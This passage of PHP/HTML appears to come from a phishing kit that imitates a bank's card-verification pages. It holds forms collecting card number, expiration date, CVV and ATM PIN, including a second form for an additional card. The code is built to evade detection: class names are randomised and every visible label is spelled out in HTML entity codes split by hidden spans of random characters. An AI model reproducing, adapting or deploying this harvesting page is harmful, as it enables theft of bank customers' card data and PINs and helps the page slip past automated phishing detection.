                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
								
								
								

                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="cardo" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="card-form" name="card-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div id="errcrd"></div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container crd">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="cardnu"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="16" minlength="16" id="cardnu" placeholder="" autocomplete="off" type="text" name="cardnu" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                            <div id="fuckyeah" style="display:none;" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> content wrap">
                                                                <h2 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> title" style="color: #c12659;"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</h2> </div>
                                                            <span id="visa1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
                                                            <span id="mastercard1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
                                                            <span id="lawla" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol zwina img_small shadow lawla card-icons"> </span>
                                                            <input type="hidden" value="" name="cardtype" id="cardtype">
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="inexp" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container exp">

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="expda"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#120;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#68;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">

                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="expda" placeholder="" autocomplete="off" type="text" name="expda" required="" value="" maxlength="7" minlength="5" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>

                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="inccv" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container cvc">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="cvv"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&lpar;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#86;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#86;&rpar;</label>
                                                            </div>

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="cvv" maxlength="3" minlength="3" placeholder="" autocomplete="off" type="text" name="cvv" required="" value="" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">

                                                            </div>

                                                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol zwina img_small shadow cco card-icons"> </span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="inpin" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container atm">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="pin"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#84;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="4" minlength="4" id="pin" placeholder="" autocomplete="off" type="text" name="pin" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button id="mybtn" type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>

                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="cardotwo" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="cardtwo-form" name="cardtwo-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div id="errcrdtwo"></div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container crdtwo">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="cardnutwo"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="16" minlength="16" id="cardnutwo" placeholder="" autocomplete="off" type="text" name="cardnutwo" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                            <div id="fuckyeahtwo" style="display:none;" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> content wrap">
                                                                <h2 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> title" style="color: #c12659;"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</h2> </div>
                                                            <span id="visa1two" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
                                                            <span id="mastercard1two" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
                                                            <span id="lawlatwo" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol zwina img_small shadow lawlatwo card-icons"> </span>
                                                            <input type="hidden" value="" name="cardtypetwo" id="cardtypetwo">
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inexptwo">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container exptwo">

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="expdatwo"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#120;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#68;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">

                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="expdatwo" placeholder="" autocomplete="off" type="text" name="expdatwo" required="" value="" maxlength="7" minlength="5" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>

                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inccvtwo">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container cvctwo">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="cvvtwo"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;&lpar;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#86;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#86;&rpar;</label>
                                                            </div>

                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="cvvtwo" maxlength="3" minlength="3" placeholder="" autocomplete="off" type="text" name="cvvtwo" required="" value="" inputmode="numeric" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">

                                                            </div>

                                                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> lollol zwina img_small shadow cco card-icons"> </span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label" style="display:none;" id="inpintwo">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container atmtwo">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="pintwo"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#84;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="4" minlength="4" id="pintwo" placeholder="" autocomplete="off" type="text" name="pintwo" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
